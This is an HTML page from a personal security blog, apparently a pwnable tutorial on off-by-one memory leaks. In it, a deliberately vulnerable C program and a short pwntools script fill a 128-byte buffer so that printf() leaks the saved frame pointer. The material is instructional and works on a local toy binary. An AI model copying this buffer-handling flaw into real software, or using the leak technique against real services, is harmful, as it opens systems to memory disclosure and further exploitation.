@@ -1,0 +1,86 @@
+<!doctype html>
+<html lang="en" data-theme="light"><head>
+  <meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>[PWNABLE] Off_By_One · whrds.log</title><meta name="description" content="※ If there are any mistakes, please let us know. We will check and correct it. ※ This is a technique that was also used when dealing with canary leaks. https://whrdud727.tistory.com/entry/PWNABLE-Canary-%EC%9A%B0%ED%9A%8C [PWNABLE] Canary bypass※ Please let me know if there are any mistakes.">
+  <meta name="theme-color" content="#f7f7f3"><link rel="canonical" href="https://whrds.github.io/en/posts/pwnable-off-by-one/">
+  <link rel="alternate" hreflang="en" href="https://whrds.github.io/en/posts/pwnable-off-by-one/"><link rel="alternate" hreflang="ko" href="https://whrds.github.io/ko/posts/pwnable-off-by-one/">
+  <meta property="og:type" content="article"><meta property="og:title" content="[PWNABLE] Off_By_One · whrds.log"><meta property="og:description" content="※ If there are any mistakes, please let us know. We will check and correct it. ※ This is a technique that was also used when dealing with canary leaks. https://whrdud727.tistory.com/entry/PWNABLE-Canary-%EC%9A%B0%ED%9A%8C [PWNABLE] Canary bypass※ Please let me know if there are any mistakes."><meta property="og:url" content="https://whrds.github.io/en/posts/pwnable-off-by-one/">
+  <link rel="icon" href="/assets/favicon.svg" type="image/svg+xml"><link rel="stylesheet" href="/assets/styles.css">
+  <script>try{const t=localStorage.getItem('theme');if(t)document.documentElement.dataset.theme=t;else if(matchMedia('(prefers-color-scheme:dark)').matches)document.documentElement.dataset.theme='dark'}catch(e){}</script>
+  <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","headline":"[PWNABLE] Off_By_One","description":"※ If there are any mistakes, please let us know. We will check and correct it. ※ This is a technique that was also used when dealing with canary leaks. https://whrdud727.tistory.com/entry/PWNABLE-Canary-%EC%9A%B0%ED%9A%8C [PWNABLE] Canary bypass※ Please let me know if there are any mistakes.","datePublished":"2024-06-24","inLanguage":"en","url":"https://whrds.github.io/en/posts/pwnable-off-by-one/","author":{"@type":"Person","name":"whrds"}}</script>
+</head><body>
+  <a class="skip-link" href="#main">Skip to content</a>
+  <header class="site-header"><div class="shell header-inner">
+    <a class="brand" href="/en/" aria-label="whrds.log home"><span class="brand-mark">W_</span><span class="brand-text">whrds.log</span></a>
+    <nav class="main-nav" aria-label="Main navigation">
+      <a href="/en/" aria-current="page">Notes</a>
+      <a href="/en/about/">About</a>
+    </nav>
+    <div class="header-tools">
+      <div class="language-switch" aria-label="Language">
+        <a href="/ko/posts/pwnable-off-by-one/" class="" lang="ko">KO</a>
+        <a href="#" class="active" lang="en" aria-current="true">EN</a>
+      </div>
+      <button class="icon-button" type="button" data-theme-toggle aria-label="Use dark theme">◐</button>
+    </div>
+  </div></header>
+  <main id="main"><article class="article-wrap"><header class="article-header"><p class="eyebrow">Security research notes</p><h1>[PWNABLE] Off_By_One</h1><p class="article-description">※ If there are any mistakes, please let us know. We will check and correct it. ※ This is a technique that was also used when dealing with canary leaks. https://whrdud727.tistory.com/entry/PWNABLE-Canary-%EC%9A%B0%ED%9A%8C [PWNABLE] Canary bypass※ Please let me know if there are any mistakes.</p><div class="article-meta"><time datetime="2024-06-24">Jun 24, 2024</time><span>·</span><span>2 min read</span></div></header><div class="prose"><p><strong>※ If there are any mistakes, please let me know. We will check and correct it. <strong>※</strong></strong> </p>
+<p>This is a technique that was also used when dealing with canary leaks.</p>
+<p><a href="https://whrdud727.tistory.com/entry/PWNABLE-Canary-%EC%9A%B0%ED%9A%8C">https://whrdud727.tistory.com/entry/PWNABLE-Canary-%EC%9A%B0%ED%9A%8C</a></p>
+<p> [[PWNABLE] Canary bypass</p>
+<p>※ If there are any mistakes, please let us know. We will check and correct it. ※ We discussed canary in the previous post. This time we will cover the workarounds. 1. canary leak 2. got overwrite (just a simple explanation)</p>
+<p><a href="http://whrdud727.tistory.com">whrdud727.tistory.com</a>](<a href="https://whrdud727.tistory.com/entry/PWNABLE-Canary-%EC%9A%B0%ED%9A%8C">https://whrdud727.tistory.com/entry/PWNABLE-Canary-우회</a>)</p>
+<p>It is one of the most used friends when leaking values such as stack, pie_base, and libc_base as well as canary.</p>
+<p>In general, functions such as printf() continue to attempt to print a string until a NULL Byte (\x00) is encountered.</p>
+<p>At this time, if there is no NULL Byte before the value to be leaked, the memory address is leaked by printf().</p>
+<p>Let’s take a look at a simple example below.</p>
+<pre><code>// gcc -no-pie -fno-stack-protector -z execstack -o ex ex.c
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+
+void gift() {
+	printf(&quot;Hello! ZZoMblE&quot;);
+	system(&quot;/bin/sh&quot;);
+}
+void initialize() {
+	setvbuf(stdin, NULL, _IONBF, 0);
+	setvbuf(stdout, NULL, _IONBF, 0);
+}
+void vuln() {
+	char buf[128];
+	printf(&quot;input : &quot;);
+
+	read(0,buf,128);
+	printf(&quot;%s&quot;,buf);
+
+}
+int main() {
+	initialize();
+	vuln();
+	return 0;
+}
+</code></pre>
+<p>If you look at it at a glance, you won’t be able to find any major vulnerabilities.</p>
+<p>The vulnerable part here is that when the value is received through read(), the input is received in the same size as the string buf. In other words, NULL Bytes must exist in the string, but if all string buffers are filled, there will be no space for NULL Bytes to exist.</p>
+<p><img src="/assets/images/tistory/tistory-d43d36c81946/001.png" alt=""></p>
+<pre><code>from pwn import *
+
+target = b'./ex'
+
+p = process(target)
+e = ELF(target)
+
+context.log_level = 'debug'
+
+payload = b'a'*128
+p.sendafter(b':', payload)
+
+p.interactive()
+</code></pre>
+<p>I used debug mode to check for memory value leaks.</p>
+<p><img src="/assets/images/tistory/tistory-d43d36c81946/002.png" alt=""></p>
+<p>You can confirm that the sfp of vuln() has become leaked.</p>
+</div><div class="article-end"><a href="/en/">← View all notes</a><a href="/ko/posts/pwnable-off-by-one/" hreflang="ko">Read this post in Korean →</a></div></article></main>
+  <footer class="site-footer"><div class="shell footer-inner"><span>© 2026 whrds</span><span>Observe, verify, document.</span><a href="/en/feed.xml">RSS</a></div></footer>
+  <script src="/assets/app.js" defer></script>
+</body></html>
